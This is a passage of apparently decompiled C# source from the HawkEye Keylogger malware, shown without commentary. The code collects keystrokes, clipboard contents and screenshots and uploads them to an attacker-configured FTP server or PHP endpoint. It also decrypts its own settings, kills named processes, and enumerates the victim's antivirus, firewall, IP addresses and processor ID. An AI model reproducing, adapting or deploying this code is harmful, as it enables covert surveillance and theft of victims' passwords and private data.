              string Data = "                                 ==============================================\r\n                                                        ClipBoard Records\r\n                                 ==============================================\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                        Keylog Records\r\n                                 ==============================================\r\n" + this.KeyLog;
              string str = Conversions.ToString(DateTime.Now).Replace("/", ".");
              this.UploadFTP("HawkEye_Keylogger_Keylog_Records_" + Conversions.ToString(num) + "_" + MyProject.Computer.Name + " " + str + ".txt", Data);
              if (Operators.CompareString(this.screeny, "Disablescreeny", false) != 0)
              {
                if (!Directory.Exists(Path.GetTempPath() + "screens"))
                  Directory.CreateDirectory(Path.GetTempPath() + "screens");
                Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
                bitmap.Save(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(this.screenynumber) + "_" + MyProject.Computer.Name + ".jpeg");
                this.UploadFTP(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(this.screenynumber) + "_" + MyProject.Computer.Name + ".jpeg");
                checked { ++this.screenynumber; }
              }
              this.KeyLog = string.Empty;
              this.CLog = string.Empty;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
    }

    public void UploadFTP(string Filename, string Data)
    {
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.ftphost + "/" + Filename);
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.ftpuser, this.ftppass);
      ftpWebRequest.Method = "STOR";
      Stream requestStream = ftpWebRequest.GetRequestStream();
      using (BinaryWriter binaryWriter = new BinaryWriter(requestStream))
        binaryWriter.Write(Data);
      requestStream.Close();
      requestStream.Dispose();
    }

    public void UploadFTP(string Filename)
    {
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.ftphost + "/" + Path.GetFileName(Filename));
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.ftpuser, this.ftppass);
      ftpWebRequest.Method = "STOR";
      byte[] buffer = System.IO.File.ReadAllBytes(Filename);
      Stream requestStream = ftpWebRequest.GetRequestStream();
      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Close();
      requestStream.Dispose();
    }

    public void SendLogsPHP()
    {
      int num = 0;
      while (true)
      {
        do
        {
          Thread.Sleep(Conversions.ToInteger(this.timerstring));
        }
        while ((string.IsNullOrEmpty(this.KeyLog.Trim()) || !this.IsConnectedToInternet()) && !false);
        checked { ++num; }
        lock (this.KeyLog)
        {
          lock (this.CLog)
          {
            try
            {
              string Data = "                                 ==============================================\r\n                                                        ClipBoard Records\r\n                                 ==============================================\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                        Keylog Records\r\n                                 ==============================================\r\n" + this.KeyLog;
              string str = Conversions.ToString(DateTime.Now).Replace("/", ".");
              this.UploadPHP("HawkEye_Keylogger_Keylog_Records_" + Conversions.ToString(num) + "_" + MyProject.Computer.Name + " " + str + ".txt", Data);
              this.KeyLog = string.Empty;
              this.CLog = string.Empty;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
    }

    public void UploadPHP(string Filename, string Data)
    {
      new WebClient().DownloadString(this.phplink + "?fname=" + Filename + "&data=" + Data);
    }

    private void CH_Changed(Clipboard sender)
    {
      lock (this.CLog)
        this.CLog = this.CLog + "[--------" + Conversions.ToString(DateAndTime.TimeOfDay) + "-------]" + Environment.NewLine + MyProject.Computer.Clipboard.GetText() + Environment.NewLine + Environment.NewLine;
    }

    public string AES_Decrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string str;
      try
      {
        byte[] numArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
        Array.Copy((Array) hash, 0, (Array) numArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) numArray, 15, 16);
        rijndaelManaged.Key = numArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string Decrypt(string encryptedBytes, string secretKey)
    {
      string str = (string) null;
      using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(encryptedBytes)))
      {
        RijndaelManaged algorithm = this.getAlgorithm(secretKey);
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, algorithm.CreateDecryptor(), CryptoStreamMode.Read))
        {
          byte[] numArray = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
          int count = cryptoStream.Read(numArray, 0, checked ((int) memoryStream.Length));
          str = Encoding.Unicode.GetString(numArray, 0, count);
        }
      }
      return str;
    }

    private RijndaelManaged getAlgorithm(string secretKey)
    {
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes("099u787978786"));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) rijndaelManaged.BlockSize / 8.0))));
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) rijndaelManaged.KeySize / 8.0))));
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      return rijndaelManaged;
    }

    public void seekanddestroy(string process__1)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (process.ProcessName.Contains(process__1))
          process.Kill();
        checked { ++index; }
      }
    }

    public string GetInternalIP()
    {
      IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
      int index = 0;
      while (index < addressList.Length)
      {
        IPAddress ipAddress = addressList[index];
        if (ipAddress.AddressFamily == AddressFamily.InterNetwork)
          return ipAddress.ToString();
        checked { ++index; }
      }
      return (string) null;
    }

    public string GetExternalIP()
    {
      return this.GetBetween(new WebClient().DownloadString("http://whatismyipaddress.com/"), "<!-- do not script -->", "<!-- do not script -->").Replace("&#46;", ".").Trim();
    }

    public string GetBetween(string Source, string Before, string After)
    {
      int startIndex = checked (Source.IndexOf(Before, 0) + Before.Length);
      if (checked (startIndex - Before.Length) == -1)
        return string.Empty;
      int num = Source.IndexOf(After, startIndex);
      if (num == -1)
        return string.Empty;
      return Source.Substring(startIndex, checked (num - startIndex));
    }

    public string GetAntiVirus()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = objectCollection.GetEnumerator();
          while (enumerator.MoveNext())
            str2 = enumerator.Current["displayName"].ToString();
        }
        finally
        {
          enumerator?.Dispose();
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public string GetFirewall()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct").Get();
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = objectCollection.GetEnumerator();
          while (enumerator.MoveNext())
            str2 = enumerator.Current["displayName"].ToString();
        }
        finally
        {
          enumerator?.Dispose();
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    private string HWID()
    {
      string empty = string.Empty;
      ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
      ManagementObjectCollection.ManagementObjectEnumerator enumerator;
      try
      {
        enumerator = instances.GetEnumerator();
        while (enumerator.MoveNext())
        {
          ManagementObject current = (ManagementObject) enumerator.Current;
          if (Operators.CompareString(empty, "", false) == 0)
          {
            empty = current.Properties["processorID"].Value.ToString();
            break;
          }
        }
      }
      finally
      {
        enumerator?.Dispose();
      }
      return empty;
    }

    public struct KBDLLHOOKSTRUCT
    {
      public int vkCode;
      public int scanCode;
      public int flags;
      public int time;
      public int dwExtraInfo;
    }

    public enum virtualKey
    {
      K_Backspace = 8,
      K_Tab = 9,
      K_Return = 13, // 0x0000000D
      K_Shift = 16, // 0x00000010
      K_Control = 17, // 0x00000011
      K_Alt = 18, // 0x00000012
      K_Pause = 19, // 0x00000013
      K_CapsLock = 20, // 0x00000014
      K_Esc = 27, // 0x0000001B
      K_Space = 32, // 0x00000020
      K_End = 35, // 0x00000023
      K_Home = 36, // 0x00000024
      K_Left = 37, // 0x00000025
      K_Up = 38, // 0x00000026
      K_Right = 39, // 0x00000027
      K_Down = 40, // 0x00000028
      K_PrintScreen = 44, // 0x0000002C
      K_Insert = 45, // 0x0000002D
      K_Delete = 46, // 0x0000002E
      K_0 = 48, // 0x00000030
      K_1 = 49, // 0x00000031
      K_2 = 50, // 0x00000032
      K_3 = 51, // 0x00000033
      K_4 = 52, // 0x00000034
      K_5 = 53, // 0x00000035
      K_6 = 54, // 0x00000036
      K_7 = 55, // 0x00000037
      K_8 = 56, // 0x00000038
      K_9 = 57, // 0x00000039
      K_A = 65, // 0x00000041
      K_B = 66, // 0x00000042
      K_C = 67, // 0x00000043
      K_D = 68, // 0x00000044
      K_E = 69, // 0x00000045
      K_F = 70, // 0x00000046
      K_G = 71, // 0x00000047
      K_H = 72, // 0x00000048
      K_I = 73, // 0x00000049
      K_J = 74, // 0x0000004A
      K_K = 75, // 0x0000004B
      K_L = 76, // 0x0000004C
      K_M = 77, // 0x0000004D
      K_N = 78, // 0x0000004E
      K_O = 79, // 0x0000004F
      K_P = 80, // 0x00000050
      K_Q = 81, // 0x00000051
      K_R = 82, // 0x00000052
      K_S = 83, // 0x00000053
      K_T = 84, // 0x00000054
      K_U = 85, // 0x00000055
      K_V = 86, // 0x00000056
      K_W = 87, // 0x00000057
      K_X = 88, // 0x00000058
      K_Y = 89, // 0x00000059
      K_Z = 90, // 0x0000005A
      K_LWin = 91, // 0x0000005B
      K_RWin = 92, // 0x0000005C
      K_Numpad0 = 96, // 0x00000060
      K_Numpad1 = 97, // 0x00000061
      K_Numpad2 = 98, // 0x00000062
      K_Numpad3 = 99, // 0x00000063
      K_Numpad4 = 100, // 0x00000064
      K_Numpad5 = 101, // 0x00000065
      K_Numpad6 = 102, // 0x00000066
      K_Numpad7 = 103, // 0x00000067
      K_Numpad8 = 104, // 0x00000068
      K_Numpad9 = 105, // 0x00000069
      K_Num_Multiply = 106, // 0x0000006A
      K_Num_Add = 107, // 0x0000006B
      K_Num_Subtract = 109, // 0x0000006D
      K_Num_Decimal = 110, // 0x0000006E
      K_Num_Divide = 111, // 0x0000006F
      K_F1 = 112, // 0x00000070
      K_F2 = 113, // 0x00000071
      K_F3 = 114, // 0x00000072
      K_F4 = 115, // 0x00000073
      K_F5 = 116, // 0x00000074
      K_F6 = 117, // 0x00000075
      K_F7 = 118, // 0x00000076
      K_F8 = 119, // 0x00000077
      K_F9 = 120, // 0x00000078
      K_F10 = 121, // 0x00000079
      K_F11 = 122, // 0x0000007A
      K_F12 = 123, // 0x0000007B
      K_F13 = 124, // 0x0000007C
      K_F14 = 125, // 0x0000007D
      K_F15 = 126, // 0x0000007E
      K_F16 = 127, // 0x0000007F
      K_F17 = 128, // 0x00000080
      K_F18 = 129, // 0x00000081
      K_F19 = 130, // 0x00000082
      K_F20 = 131, // 0x00000083
      K_F21 = 132, // 0x00000084
      K_F22 = 133, // 0x00000085
      K_F23 = 134, // 0x00000086
      K_F24 = 135, // 0x00000087
      K_NumLock = 144, // 0x00000090
      K_LShift = 160, // 0x000000A0
      K_RShift = 161, // 0x000000A1
      K_LControl = 162, // 0x000000A2
      K_RControl = 163, // 0x000000A3
      K_LAlt = 164, // 0x000000A4
      K_RAlt = 165, // 0x000000A5
      K_Subtract = 189, // 0x000000BD
      K_Decimal = 190, // 0x000000BE
    }

    private delegate int KeyboardHookDelegate(int Code, int wParam, ref Form1.KBDLLHOOKSTRUCT lParam);
  }
}
